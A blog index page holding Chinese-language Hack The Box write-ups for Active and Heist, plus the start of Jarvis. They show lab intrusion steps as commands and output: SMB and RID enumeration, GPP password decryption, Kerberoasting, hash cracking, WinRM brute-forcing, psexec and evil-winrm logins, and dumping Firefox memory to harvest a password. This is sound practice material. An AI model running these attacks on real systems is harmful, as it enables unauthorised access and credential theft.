<!DOCTYPE html><html><head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  
  
  <title>  Ikonw Blog </title>

 
  
    <link rel="icon" href="/images/avatar.jpg">
  


  
<link rel="stylesheet" href="/nayo.min.css">
 
<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
</head>  
  <body>   
    
      <header class="header-wrapper">
  <nav class="inner">
    <div class="title">
      <a href="/">
        <img class="logo" src="/images/logo.png">
      </a>
    </div>

    <ul class="menu">
      <li class="item">
        <a class="link" id="menu-home" href="/"> <!-- Home -->
          <i class="iconfont icon-home"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-archives" href="/archives"> <!-- Archives -->
          <i class="iconfont icon-archives"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-tags" href="/tags"> <!-- Tags -->
          <i class="iconfont icon-tags"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-about" href="/about"> <!-- About -->
          <i class="iconfont icon-about"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-search"> <!-- Search -->
          <i class="iconfont icon-search"></i>
        </a>
      </li>
    </ul>
  </nav>
</header>


<header class="mobile-header-wrapper">
  <i id="mobile-toggle" class="iconfont icon-menu mobile-toggle"></i>
</header>   

      <div class="container">       
          
          
            <div class="container-inner">  
          

          


<div class="index slideDownMin">
	

	<div class="profile">

		<img class="avatar" src="/images/avatar.jpg">

		<p class="author">Ikonw</p>

<div class="social">

<a class="iconfont icon-Github" target="_blank" href="https://github.com/Ik0nw" title="Github">
</a>

<a class="iconfont icon-Telegram" target="_blank" href="https://t.me/ikonwwww" title="Telegram">
</a>

</div>
	</div>


	

	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/02/10/HTB-Active/">HTB Active Writeup</a>  
	       
		 

		<div class="meta">
			<time>Feb 10, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<p>攻击机：官方Kali linux 2019 64位<br>作者：<strong>Ikonw</strong></p>
<h1 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h1><p><img src="/images/old-machine-images/20200210210254278.png" alt="在这里插入图片描述"></p>
<h1 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h1><p>这边我用的是我在OSCP时候用的一个脚本工具（懒惰）</p>
<p><a target="_blank" rel="noopener" href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a><br><img src="/images/old-machine-images/202002102107263.png" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">./nmapAutomator.sh 10.10.10.100 Full</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>除了53和445并没有什么特别能交互的端口</p>
<figure class="highlight less"><table><tbody><tr><td class="code"><pre><span class="line"><span class="selector-tag">Starting</span> <span class="selector-tag">Nmap</span> <span class="number">7.80</span> ( <span class="attribute">https</span>:<span class="comment">//nmap.org ) at 2020-02-10 18:56 +08</span></span><br><span class="line">Nmap scan report for <span class="number">10.10</span>.<span class="number">10.100</span></span><br><span class="line">Host is up (<span class="number">0.23s</span> latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line"><span class="number">53</span>/tcp    open  domain        Microsoft DNS <span class="number">6.1</span>.<span class="number">7601</span> (<span class="number">1</span>DB15D39) (Windows Server <span class="number">2008</span> R2 SP1)</span><br><span class="line">| <span class="attribute">dns-nsid</span>: </span><br><span class="line">|_  bind.<span class="attribute">version</span>: Microsoft DNS <span class="number">6.1</span>.<span class="number">7601</span> (<span class="number">1</span>DB15D39)</span><br><span class="line"><span class="number">88</span>/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="attribute">time</span>: <span class="number">2020</span>-<span class="number">02</span>-<span class="number">10</span> <span class="number">10</span>:<span class="number">57</span>:<span class="number">27</span>Z)</span><br><span class="line"><span class="number">135</span>/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line"><span class="number">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP (<span class="attribute">Domain</span>: active.htb, <span class="attribute">Site</span>: Default-First-Site-Name)</span><br><span class="line"><span class="number">445</span>/tcp   open  microsoft-ds?</span><br><span class="line"><span class="number">464</span>/tcp   open  kpasswd5?</span><br><span class="line"><span class="number">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">636</span>/tcp   open  tcpwrapped</span><br><span class="line"><span class="number">3268</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (<span class="attribute">Domain</span>: active.htb, <span class="attribute">Site</span>: Default-First-Site-Name)</span><br><span class="line"><span class="number">3269</span>/tcp  open  tcpwrapped</span><br><span class="line"><span class="number">5722</span>/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">9389</span>/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line"><span class="number">47001</span>/tcp open  http          Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line">|<span class="attribute">_http-server-header</span>: Microsoft-HTTPAPI/<span class="number">2.0</span></span><br><span class="line">|<span class="attribute">_http-title</span>: <span class="keyword">Not</span> Found</span><br><span class="line"><span class="number">49152</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49153</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49154</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49155</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49157</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">49158</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49169</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49171</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49182</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service <span class="attribute">Info</span>: <span class="attribute">Host</span>: DC; <span class="attribute">OS</span>: Windows; <span class="attribute">CPE</span>: <span class="attribute">cpe</span>:/<span class="attribute">o</span>:<span class="attribute">microsoft</span>:<span class="attribute">windows_server_2008</span>:<span class="attribute">r2</span>:sp1, <span class="attribute">cpe</span>:/<span class="attribute">o</span>:<span class="attribute">microsoft</span>:windows</span><br><span class="line"></span><br><span class="line">Host script <span class="attribute">results</span>:</span><br><span class="line">|<span class="attribute">_clock-skew</span>: <span class="number">38s</span></span><br><span class="line">| <span class="attribute">smb2-security-mode</span>: </span><br><span class="line">|   <span class="number">2.02</span>: </span><br><span class="line">|_    Message signing enabled <span class="keyword">and</span> required</span><br><span class="line">| <span class="attribute">smb2-time</span>: </span><br><span class="line">|   <span class="attribute">date</span>: <span class="number">2020</span><span class="attribute">-02-10T10</span>:<span class="number">58</span>:<span class="number">25</span></span><br><span class="line">|_  <span class="attribute">start_date</span>: <span class="number">2020</span><span class="attribute">-02-10T08</span>:<span class="number">17</span>:<span class="number">06</span></span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at <span class="attribute">https</span>:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap <span class="attribute">done</span>: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">194.25</span> seconds</span><br><span class="line"></span><br><span class="line"><span class="number">12345678910111213141516171819202122232425262728293031323334353637383940414243444546</span></span><br></pre></td></tr></tbody></table></figure>

<h1 id="一，SMB-ENUMERATION"><a href="#一，SMB-ENUMERATION" class="headerlink" title="一，SMB ENUMERATION"></a>一，SMB ENUMERATION</h1><p>首先 使用smbmap 来确定anonymous用户的权限（如果有写权限可以直接用impacket 来获取shell）</p>
<figure class="highlight nginx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">smbmap</span> -H <span class="number">10.10.10.100</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>发现对 <strong>Replication</strong> 文件夹 <strong>READ ONLY</strong>权限<br><img src="/images/old-machine-images/20200210211447140.png" alt="在这里插入图片描述"><br>（这里我本来想使用mount挂载smb, 但失败了。有成功的可以在评论告诉我。）</p>
<p>使用 smbclient进行连接 <strong>Replication</strong></p>
<figure class="highlight taggerscript"><table><tbody><tr><td class="code"><pre><span class="line">smbclient <span class="symbol">\\</span><span class="symbol">\\</span>10.10.10.100<span class="symbol">\\</span>Replication</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>发现两个有意思的文件夹</p>
<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">31B2F340</span>-<span class="number">016</span>D-<span class="number">11</span>D2-<span class="number">945</span>F-<span class="number">00</span>C04FB984F9 是Default admin policy</span><br><span class="line"><span class="attribute">6AC1786C</span>-<span class="number">016</span>F-<span class="number">11</span>D2-<span class="number">945</span>F-<span class="number">00</span>C04fB984F9 是Default domain polices</span><br><span class="line"><span class="attribute">12</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/2020021021181611.png" class="lazyload"><br>如果没记错的话 windows server 2012以下的版本 会把密码储存在GPO。<br>经过一番查找<br><strong>smb: \active.htb\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups</strong></p>
<p>在此目录发现Groups.xml</p>
<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200210212552448.png" class="lazyload"><br>发现帐号和密码哈希值</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">帐号：active.htb\SVC_TGS</span><br><span class="line">哈希值：edBSHOwhZLTjt<span class="regexp">/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/</span>NglVmQ</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></tbody></table></figure>

<p>可以使用kali自带的gpp-decrypt来破解密码</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">gpp-decrypt edBSHOwhZLTjt<span class="regexp">/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/</span>NglVmQ</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>得到密码 <strong>GPPstillStandingStrong2k18</strong><br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200210212726788.png" class="lazyload"><br>现在我们有了新的帐号 利用Smbmap确认我们是否有写的权限（拿shell）</p>
<figure class="highlight nginx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">smbmap</span> -H <span class="number">10.10.10.100</span> -u SVC_TGS -p GPPstillStandingStrong2k18</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200210213100537.png" class="lazyload"><br>发现能读权限能读到user目录里的文件<br>可以用smbclient 进去拿user.txt</p>
<h1 id="三，ROOT"><a href="#三，ROOT" class="headerlink" title="三，ROOT"></a>三，ROOT</h1><p>之前看到 端口88 有 kerberos 在运行。尝试利用kerberoasing 攻击</p>
<p><a target="_blank" rel="noopener" href="https://www.chainnews.com/articles/094369852800.htm">Kerberoasing 攻击</a></p>
<p>利用 impacket-GetUserSPNs</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>bin<span class="regexp">/impacket-GetUserSPNs -request active.htb/</span>SVC_TGS:GPPstillStandingStrong2k18 -dc-ip <span class="number">10.10</span>.<span class="number">10.100</span> </span><br><span class="line"></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200210221812462.png" class="lazyload"><br>得到hash后 利用john the ripper进行破解<br>得到 Administrator密码为 Ticketmaster1968<br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/202002102219053.png" class="lazyload"></p>
<p>取到帐号和密码后 我们可以使用 impacket psexec 进行登录</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/doc/</span>python3-impacket<span class="regexp">/examples/</span>psexec.py active.htb/Administrator:Ticketmaster1968@<span class="number">10.10</span>.<span class="number">10.100</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200210222712526.png" class="lazyload"></p>
<p>成功 拿到Administrator</p>
<br>
<br>
<br>

<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			            
				<a class="link" href="/tags/smb/">smb</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/02/10/HTB-Active/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/01/26/HTB-Heist/">HTB Heist Writeup</a>  
	       
		 

		<div class="meta">
			<time>Jan 26, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<h1 id="No-4-Heist-难度简单-HTB-walkthrough"><a href="#No-4-Heist-难度简单-HTB-walkthrough" class="headerlink" title="No.4-Heist-难度简单-HTB-walkthrough"></a>No.4-Heist-难度简单-HTB-walkthrough</h1><p>攻击机：官方Kali linux 2019 64位<br>作者：<strong>Ikonw</strong></p>
<h1 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h1><p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126112412354.png" class="lazyload"></p>
<h1 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h1><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">nmap -sV -sC heist.htb</span><br><span class="line">1</span><br><span class="line">Nmap scan report <span class="keyword">for</span> heist.htb (10.10.10.149)</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">80/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-title: Support Login Page</span><br><span class="line">|_Requested resource was login.php                                                                                                                                                                                                         </span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                                          </span><br><span class="line">445/tcp open  microsoft-ds?                                                                                                                                                                                                                </span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                                                                   </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">Host script results:                                                                                                                                                                                                                       </span><br><span class="line">|_clock-skew: 4s                                                                                                                                                                                                                           </span><br><span class="line">| smb2-security-mode:                                                                                                                                                                                                                      </span><br><span class="line">|   2.02:                                                                                                                                                                                                                                  </span><br><span class="line">|_    Message signing enabled but not required                                                                                                                                                                                             </span><br><span class="line">| smb2-time:                                                                                                                                                                                                                               </span><br><span class="line">|   <span class="built_in">date</span>: 2020-01-25T01:23:05                                                                                                                                                                                                              </span><br><span class="line">|_  start_date: N/A                                                                                                                                                                                                                        </span><br><span class="line">1234567891011121314151617181920212223242526</span><br></pre></td></tr></tbody></table></figure>

<h1 id="二，HTTP-Enumeration"><a href="#二，HTTP-Enumeration" class="headerlink" title="二，HTTP Enumeration"></a>二，HTTP Enumeration</h1><p>进入web, 是个登陆页面。 并没有找到CMS, 右下角有个 <strong>Login as guest</strong><br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126114331293.png" class="lazyload"><br>发现这是个 类似于 <strong>Support desk</strong> 的平台。<br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126113042235.png" class="lazyload"><br>点击 Attachment 跳转到 config.txt</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">version 12.2</span><br><span class="line">no service pad</span><br><span class="line">service password-encryption</span><br><span class="line">!</span><br><span class="line">isdn switch-type basic-5ess</span><br><span class="line">!</span><br><span class="line">hostname ios-1</span><br><span class="line">!</span><br><span class="line">security passwords min-length 12</span><br><span class="line"><span class="built_in">enable</span> secret 5 $1$pdQG<span class="variable">$o8nrSzsGXeaduXrjlvKc91</span></span><br><span class="line">!</span><br><span class="line">username rout3r password 7 0242114B0E143F015F5D1E161713</span><br><span class="line">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">ip ssh authentication-retries 5</span><br><span class="line">ip ssh version 2</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">router bgp 100</span><br><span class="line"> synchronization</span><br><span class="line"> bgp log-neighbor-changes</span><br><span class="line"> bgp dampening</span><br><span class="line"> network 192.168.0.0Â mask 300.255.255.0</span><br><span class="line"> timers bgp 3 9</span><br><span class="line"> redistribute connected</span><br><span class="line">!</span><br><span class="line">ip classless</span><br><span class="line">ip route 0.0.0.0 0.0.0.0 192.168.0.1</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">access-list 101 permit ip any any</span><br><span class="line">dialer-list 1 protocol ip list 101</span><br><span class="line">!</span><br><span class="line">no ip http server</span><br><span class="line">no ip http secure-server</span><br><span class="line">!</span><br><span class="line">line vty 0 4</span><br><span class="line"> session-timeout 600</span><br><span class="line"> authorization <span class="built_in">exec</span> SSH</span><br><span class="line"> transport input ssh</span><br><span class="line">1234567891011121314151617181920212223242526272829303132333435363738394041</span><br></pre></td></tr></tbody></table></figure>

<p>其中有三行是包含哈希值的</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">enable</span> secret 5 $1$pdQG<span class="variable">$o8nrSzsGXeaduXrjlvKc91</span>  // Type 5 </span><br><span class="line">!</span><br><span class="line">username rout3r password 7 0242114B0E143F015F5D1E161713 //Type 7 </span><br><span class="line">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 //type 7 </span><br><span class="line">1234</span><br></pre></td></tr></tbody></table></figure>

<p>按照之前所说的，这应该分别CISCO的哈希值。<br>分别为 type 5 跟 type 7。type 5是有salt过的。<br>利用网上的工具来进行破解。</p>
<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126114855103.png" class="lazyload"><br>Type 5 的比较麻烦，网上的工具没能找到密码。<br>找到一个 <a target="_blank" rel="noopener" href="https://github.com/axcheron/cisco_pwdecrypt">github脚本</a>。<br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126115301683.png" class="lazyload"><br>现在我们已经找到全部的账号和密码</p>
<table>
<thead>
<tr>
<th>账号</th>
<th>密码</th>
</tr>
</thead>
<tbody><tr>
<td>admin</td>
<td>$uperP@ssword</td>
</tr>
<tr>
<td>rout3r</td>
<td>Q4)sJu\Y8qz*A3?d</td>
</tr>
<tr>
<td>Hazard</td>
<td>stealth1agent</td>
</tr>
</tbody></table>
<h1 id="三，拿到shell"><a href="#三，拿到shell" class="headerlink" title="三，拿到shell"></a>三，拿到shell</h1><p>尝试使用现有的账号和密码 来登陆网页，但提示需要用邮箱。利用了例子如 <strong><a href="mailto:admin@heist.htb">admin@heist.htb</a></strong><br>也没有进展。</p>
<p>利用metasploit 的smblogin 来进行爆破。<br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/202001261158540.png" class="lazyload"><br>发现只有 <strong>Hazrd:stealth1agent</strong> 可以登陆<br>发现权限都是No Access和READ。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">root@xing<span class="comment"># smbmap -H 10.10.10.149 -u hazard -p stealth1agent</span></span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[+] User SMB session establishd on 10.10.10.149...</span><br><span class="line">[+] IP: 10.10.10.149:445        Name: 10.10.10.149                                      </span><br><span class="line">        Disk                                                    Permissions</span><br><span class="line">        ----                                                    -----------</span><br><span class="line">        ADMIN$                                                  NO ACCESS</span><br><span class="line">        C$                                                      NO ACCESS</span><br><span class="line">        IPC$                                                    READ ONLY</span><br><span class="line">123456789</span><br></pre></td></tr></tbody></table></figure>

<blockquote>
<p>IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p>
</blockquote>
<p>在这里我们可以利用 <strong>READ ONLY</strong> 的IPC$来取得本地账号的信息。</p>
<p>利用rpclient来连接</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">rpcclient -U <span class="string">"Hazard%stealth1agent"</span> heist.htb</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126121648687.png" class="lazyload"><br>我们也可以同样利用SID来获取用户名<br>sid的后四位是用户的编号，我们可以通过逐渐增加来找到本机的用户名字</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126121846444.png" class="lazyload"><br>发现多三个用户为 Chase,support,Jason。</p>
<p>另外一个方法是用 <strong>impacket</strong> (好东西呀）。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">root@xing:/opt<span class="comment"># locate lookupsid.py</span></span><br><span class="line">/usr/share/doc/python3-impacket/examples/lookupsid.py</span><br><span class="line"></span><br><span class="line">root@xing:/opt<span class="comment"># python /usr/share/doc/python3-impacket/examples/lookupsid.py Hazard:stealth1agent@10.10.10.149</span></span><br><span class="line">Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Brute forcing SIDs at 10.10.10.149</span><br><span class="line">[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]</span><br><span class="line">[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112</span><br><span class="line">500: SUPPORTDESK\Administrator (SidTypeUser)</span><br><span class="line">501: SUPPORTDESK\Guest (SidTypeUser)</span><br><span class="line">503: SUPPORTDESK\DefaultAccount (SidTypeUser)</span><br><span class="line">504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)</span><br><span class="line">513: SUPPORTDESK\None (SidTypeGroup)</span><br><span class="line">1008: SUPPORTDESK\Hazard (SidTypeUser)</span><br><span class="line">1009: SUPPORTDESK\support (SidTypeUser)</span><br><span class="line">1012: SUPPORTDESK\Chase (SidTypeUser)</span><br><span class="line">1013: SUPPORTDESK\Jason (SidTypeUser)</span><br><span class="line">123456789101112131415161718</span><br></pre></td></tr></tbody></table></figure>

<p>尝试了各种组合还是无法登陆smb或者web。<br>于是决定再扫一遍nmap 看看有没有什么高端口是漏掉的。<br>发现了5985端口开着</p>
<blockquote>
<p>WinRM 是windows 一种方便远程管理的服务；开启winrm service,便于在日常工作中，远程管理服务器，或通过脚本，同时管理多台服务器，来提高工作效率</p>
</blockquote>
<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126145922341.png" class="lazyload"><br>这边可以利用一种工具叫evil-winrm 来进行登陆。</p>
<p>有兴趣的可以了解更多<br><a target="_blank" rel="noopener" href="https://www.uedbox.com/post/58739/">Evil-winRM 远程管理shell</a></p>
<p>首先，利用metasploit 的 <strong>scanner/winrm/winrm_login</strong> 模块来爆破帐号和密码。<br>（这么多帐号和密码 到底哪个密码是哪个呀）。</p>
<p>把新取得的账号 全部保存进 possible_user。<br>然后根据lookupsid取得的 DOMAIN填写。</p>
<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126150720402.png" class="lazyload"></p>
<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126150815832.png" class="lazyload"></p>
<p>成功取得有效登陆</p>
<p><strong>Chase:Q4)sJu\Y8qz*A3?d</strong></p>
<p>利用evil-winrm 进行登陆</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ruby evil-winrm.rb -i 10.10.10.149 -u Chase -p <span class="string">"Q4)sJu\Y8qz*A3?d"</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126151024557.png" class="lazyload"></p>
<h1 id="四，提权"><a href="#四，提权" class="headerlink" title="四，提权"></a>四，提权</h1><p>一番探索后 发现有 <strong>firefox</strong> 的程序再跑<br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/2020012615214765.png" class="lazyload"><br>利用微软的procdump把 firefox的日志</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</a></p>
<p>利用 evil-winrm 上传 procdump.exe 然后执行</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">upload proxdump.exe</span><br><span class="line">procdump -ma 2892</span><br><span class="line">12</span><br></pre></td></tr></tbody></table></figure>

<p>后面用 grep 找出admin 后发现密码。<br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/old-machine-images/20200126170033546.png" class="lazyload"><br>使用evil win-rm 登陆后 取到 root flag</p>
<br>
<br>
<br>

<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/01/26/HTB-Heist/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/01/22/HTB-jarvis/">HTB Jarvis Writeup</a>  
	       
		 

		<div class="meta">
			<time>Jan 22, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<blockquote>
<p>挺有意思的一台机器，有挺多种方式拿 low priv shell。</p>
</blockquote>
<p>攻击机：官方Kali linux 2019 64位<br>作者：<strong>Ikonw</strong></p>
<h1 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h1><p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122113820431.png" class="lazyload"></p>
<h1 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h1><p>只有HTTP 比较有兴趣，title 是 <strong>Stark Hotel</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-22 11:48 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> jarvis.htb (10.10.10.143)</span><br><span class="line">Host is up (0.33s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)</span><br><span class="line">|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)</span><br><span class="line">|_  256 77:d4:ae:1f:b0:be:15:1f:f8:<span class="built_in">cd</span>:c8:15:3a:c3:69:e1 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Stark Hotel</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">123456789101112131415161718</span><br></pre></td></tr></tbody></table></figure>

